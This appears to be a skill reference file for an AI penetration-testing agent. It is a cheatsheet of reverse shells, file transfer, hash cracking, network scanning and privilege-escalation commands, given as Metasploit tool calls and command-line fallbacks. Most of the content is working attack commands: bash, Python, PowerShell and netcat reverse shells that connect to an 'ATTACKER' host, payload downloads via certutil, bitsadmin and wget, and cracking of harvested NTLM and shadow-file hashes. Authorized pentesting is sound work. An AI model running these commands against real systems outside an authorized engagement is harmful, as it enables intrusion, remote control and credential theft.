---
name: methodology-cheatsheets
description: >-
  Central reference for pentest methodology, cross-cutting cheatsheets, reverse
  shells, file transfer, hash cracking, network discovery, and common tool syntax.
  Use during recon, threat modeling, post-exploit, and reporting when any domain
  skill needs quick operational references.
---

# Methodology and Cheatsheets

## When to Use

- **Model phase (SG2.*)**: threat modeling and attack scenario planning
- **Recon**: network discovery, external footprinting
- **Post-exploit**: shells, pivoting, hash cracking, tool syntax
- **Report phase (SG6.*)**: finding structure (see `reporting-pentest`)
- Any agent needs a **quick reference** not covered by a domain skill

## Pentest methodology flow

```
pre_engage  -> scope, ROE, rules of engagement
recon       -> passive/active discovery, service mapping
model       -> attack paths, prioritization
analyze     -> vuln validation, exploitability
exploit     -> controlled access (check before exploit)
post_exploit -> privesc, lateral, pivot, cred harvest
report      -> findings, evidence, remediation
```

Route deep execution to domain skills: AD (`internal-ad-pentest`), cloud (`cloud-pentest`), web (`web-app-pentest`), containers (`container-devops-pentest`).

## Reverse shells

### Start listener

**MSF MCP (preferred):**
```text
msf_start_listener(
  engagement_id="<id>",
  payload="linux/x64/shell/reverse_tcp",
  lhost="<attacker>",
  lport=4444
)
```

**CLI fallback:**
```bash
nc -lvnp 4444
ncat -lvnp 4444 --ssl
```

### Bash reverse shell

**MSF:** No direct module. Use `msf_start_listener` then trigger shell on target.

**CLI fallback:**
```bash
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
```

### Python reverse shell

**MSF:** No direct module. Use listener + target-side Python one-liner.

**CLI fallback:**
```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

### PowerShell reverse shell

**MSF MCP (preferred):**
```text
msf_generate_payload(
  engagement_id="<id>",
  payload="windows/x64/meterpreter/reverse_tcp",
  format="psh",
  options={"LHOST": "ATTACKER", "LPORT": 4444},
  output_path="evidence/msf/revshell.ps1"
)
```

**CLI fallback:**
```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER",4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
  $sendback = (iex $data 2>&1 | Out-String)
  $sendback2 = $sendback + "PS " + (pwd).Path + "> "
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
  $stream.Write($sendbyte,0,$sendbyte.Length)
}
```

### Netcat variants

**MSF:** No direct module. Use `msf_start_listener` with `cmd/unix/reverse_netcat` payload.

**CLI fallback:**
```bash
nc -e /bin/bash ATTACKER 4444
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f
nc ATTACKER 4444 -e cmd.exe
```

### Upgrade to TTY

**MSF MCP (preferred):**
```text
msf_session_upgrade(
  engagement_id="<id>",
  session_id=1
)
```

**CLI fallback:**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm; stty rows 50 cols 120
# Ctrl+Z -> stty raw -echo; fg
```

## File transfer

### HTTP serve and download

**MSF MCP (preferred):**
```text
msf_send_session_command(
  engagement_id="<id>",
  session_id=1,
  command="download C:\\Users\\Public\\file.exe"
)
msf_send_session_command(
  engagement_id="<id>",
  session_id=1,
  command="upload /tmp/tool /usr/local/bin/tool"
)
```

**CLI fallback:**
```bash
python3 -m http.server 8080
wget http://ATTACKER:8080/file -O /tmp/file
curl -o file http://ATTACKER:8080/file
```

### Windows file transfer

**MSF MCP (preferred):**
```text
msf_run_post_module(
  engagement_id="<id>",
  module_name="windows/manage/powershell/exec_powershell",
  session_id=1,
  options={"PAYLOAD": "IWR http://ATTACKER/file -OutFile C:\\Temp\\file"}
)
```

**CLI fallback:**
```powershell
certutil -urlcache -split -f http://ATTACKER/file.exe file.exe
bitsadmin /transfer job http://ATTACKER/file C:\Temp\file.exe
IWR http://ATTACKER/file -OutFile C:\Temp\file
copy \\ATTACKER\share\file.exe C:\Temp\
```

### SCP and base64

**MSF:** No direct module. Use `msf_send_session_command` upload/download.

**CLI fallback:**
```bash
scp file user@host:/tmp/
base64 -w0 file > b64.txt
# On target: base64 -d b64.txt > file
```

## Hash cracking

### Import creds from MSF

**MSF MCP (preferred):**
```text
msf_credential_info(workspace="default")
msf_loot_info(workspace="default")
```

**CLI fallback:**
```bash
wsl -e bash -lc "msfconsole -q -x 'creds; loot; exit'"
cat evidence/msf/hashes.txt
```

### Hashcat workflow

**MSF:** No direct module. Export hashes from `msf_credential_info` then crack offline.

**CLI fallback:**
```bash
hashcat -m 1000 hashes.txt wordlist.txt -r rules/best64.rule
hashcat -m 1000 hashes.txt -a 3 ?u?l?l?l?l?l?d?d
hashcat -m 1000 hashes.txt --show
```

### John the Ripper

**MSF:** No direct module. Use exported hash files.

**CLI fallback:**
```bash
john --wordlist=rockyou.txt hashes.txt
john --format=nt hashes.txt --wordlist=rockyou.txt
unshadow passwd shadow > unshadowed.txt
john --wordlist=rockyou.txt unshadowed.txt
```

### Common hashcat modes

| Hash type | Mode |
|-----------|------|
| MD5 | 0 |
| SHA1 | 100 |
| NTLM | 1000 |
| NetNTLMv2 | 5600 |
| Kerberos 5 TGS-REP | 13100 |
| bcrypt | 3200 |
| WPA-PMKID/EAPOL | 22000 |
| Linux sha512crypt | 1800 |

## Network discovery

### Host discovery via MSF

**MSF MCP (preferred):**
```text
msf_db_nmap(
  engagement_id="<id>",
  targets="10.10.10.0/24",
  nmap_args="-sn"
)
msf_host_info(only_up=true)
```

**CLI fallback:**
```bash
nmap -sn 10.10.10.0/24
nmap -Pn -sn 10.10.10.0/24
arp-scan -l
nbtscan -r 10.10.10.0/24
```

### Port and service scan

**MSF MCP (preferred):**
```text
msf_db_nmap(
  engagement_id="<id>",
  targets="TARGET",
  nmap_args="-sS -sV -sC -p-"
)
msf_service_info(host="TARGET", only_up=true)
```

**CLI fallback:**
```bash
nmap -sS -sV -sC -O -p- TARGET
nmap -sU --top-ports 100 TARGET
nmap -p 445,139,88,389,636,3389 TARGET
masscan -p1-65535 10.10.10.0/24 --rate=1000
```

### DNS enumeration

**MSF MCP (preferred):**
```text
msf_run_auxiliary_module(
  engagement_id="<id>",
  module_name="auxiliary/gather/enum_dns",
  options={"DOMAIN": "domain.com"}
)
```

**CLI fallback:**
```bash
nslookup -type=any domain.com
dig axfr @ns1.domain.com domain.com
nslookup -type=srv _ldap._tcp.dc._msdcs.domain.com
```

## Common tool syntax

### Gobuster

**MSF:** No direct module. Use `msf_run_auxiliary_module` with `auxiliary/scanner/http/dir_scanner` or CLI.

**CLI fallback:**
```bash
gobuster dir -u http://TARGET/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak
gobuster vhost -u http://TARGET/ -w subdomains.txt
gobuster dns -d domain.com -w subdomains.txt
```

### ffuf

**MSF:** No direct module. Use CLI or Burp.

**CLI fallback:**
```bash
ffuf -u http://TARGET/FUZZ -w wordlist.txt -mc 200,301,302
ffuf -u http://TARGET/ -H "Host: FUZZ.domain.com" -w vhosts.txt
ffuf -u http://TARGET/login -X POST -d "user=FUZZ&pass=test" -w users.txt
```

## Privilege escalation checklists (summary)

### Linux quick wins

**MSF MCP (preferred):**
```text
msf_run_post_module(
  engagement_id="<id>",
  module_name="multi/recon/local_exploit_suggester",
  session_id=1
)
```

**CLI fallback:**
```bash
id; sudo -l; cat /etc/passwd; uname -a
find / -perm -4000 2>/dev/null
find / -writable -type d 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.*
ss -tulpn; ps aux
```

Load `linux-pentest` for full enumeration.

### Windows quick wins

**MSF MCP (preferred):**
```text
msf_run_post_module(
  engagement_id="<id>",
  module_name="multi/recon/local_exploit_suggester",
  session_id=1
)
```

**CLI fallback:**
```powershell
whoami /all; systeminfo
net user; net localgroup administrators
wmic qfe; Get-HotFix
accesschk.exe -uwcqv "Authenticated Users" *
```

Load `windows-pentest` for full enumeration.

## Workflow integration

| Phase | Use this skill for |
|-------|-------------------|
| pre_engage | Scope methodology review |
| recon | Network discovery, nmap, DNS |
| model | Attack path planning |
| post_exploit | Shells, file transfer, hash cracking |
| report | Cross-reference `reporting-pentest` |

## Related skills

- `pentest-workflow` - phase/gate orchestration
- `msf-recon` - MCP-based recon workflow
- `reporting-pentest` - finding documentation
- Domain skills for deep execution paths
